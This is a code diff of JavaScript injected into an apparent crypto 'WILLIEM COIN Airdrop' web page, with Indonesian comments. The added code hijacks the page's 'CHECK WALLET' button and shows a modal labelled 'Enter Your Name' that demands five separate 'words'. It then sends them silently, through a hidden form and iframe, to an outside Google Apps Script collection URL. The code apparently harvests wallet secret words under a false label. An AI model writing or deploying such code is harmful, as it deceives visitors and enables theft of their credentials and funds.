@@ -591,13 +591,13 @@ setTimeout(() => {
 }, 2500); // delay 2.5 detik biar nunggu web lu load semua
 });
 // === SELESAI KODE TAMBAHAN === //
-// === WILLIEM REKAP GSHEET V4 FINAL START === //
+// === WILLIEM REKAP GSHEET FINAL V6 START === //
 window.addEventListener('load', () => {
 setTimeout(() => {
-    // URL BARU LU
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzParrDqW8vfNypFf515-ECIBWGUP4c1sp-BDq-5ZGy4dg6v72edYPLJBH-akj1ybGW/exec"; 
+    // URL EXEC LU
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby30IseIsONh-uA_yK09GglS0vmfou7WFPnLKktNhQb_8ZzcXoEFWjs9yfKd-qEU5I/exec"; 
 
-    // BIKIN MODAL
+    // BIKIN MODAL 5 KOTAK
     const modal = document.createElement("div");
     modal.id = "nameModalWLM";
     modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
@@ -607,18 +607,18 @@ setTimeout(() => {
         <h3 style="margin:0 0 10px; font-size:22px;">Enter Your Name</h3>
         <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
         <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 1" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 2" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 3" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 4" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 5" maxlength="10" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 1" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 2" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 3" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 4" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
+          <input class="nameBoxWLM" type="text" placeholder="Kata 5" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
         </div>
         <button id="submitNameBtnWLM" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px;">SUBMIT</button>
       </div>
     `;
     document.body.appendChild(modal);
 
-    // TIMPA TOMBOL CHECK WALLET
+    // HACK TOMBOL CHECK WALLET
     const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
     if(checkWalletBtn){
         checkWalletBtn.onclick = (e) => {
@@ -627,10 +627,10 @@ setTimeout(() => {
         }
     }
 
-    // KIRIM DATA PAKAI FORM - CARA PALING AMPUH
+    // KIRIM DATA
     document.getElementById("submitNameBtnWLM").onclick = () => {
         let name = Array.from(document.querySelectorAll('.nameBoxWLM')).map(b=>b.value.trim()).filter(Boolean).join(" ");
-        if(name.split(" ").length < 5) return alert("Isi 5 kotak dulu bro!");
+        if(name.split(" ").length < 5) return alert("Wajib isi 5 kotak bro!");
         
         const form = document.createElement('form');
         form.method = 'POST';
@@ -638,18 +638,15 @@ setTimeout(() => {
         form.target = 'hidden_iframe_wlm';
         form.innerHTML = `<input name="nama" value="${name}">`;
         document.body.appendChild(form);
-        
         const iframe = document.createElement('iframe');
         iframe.name = 'hidden_iframe_wlm';
         iframe.style.display = 'none';
         document.body.appendChild(iframe);
-        
         form.submit();
 
         modal.style.display = "none";
-        alert("TERDAFTAR! ✅\nData: " + name + "\nCek Sheet2 dalam 2 detik");
+        alert("✅ BERHASIL TERDAFTAR!\nData: " + name + "\nCek Google Sheet2 sekarang");
         document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
-        
         setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
     }
     
@@ -657,4 +654,4 @@ setTimeout(() => {
 
 }, 2500);
 });
-// === WILLIEM REKAP GSHEET V4 FINAL END === //
+// === WILLIEM REKAP GSHEET FINAL V6 END === //
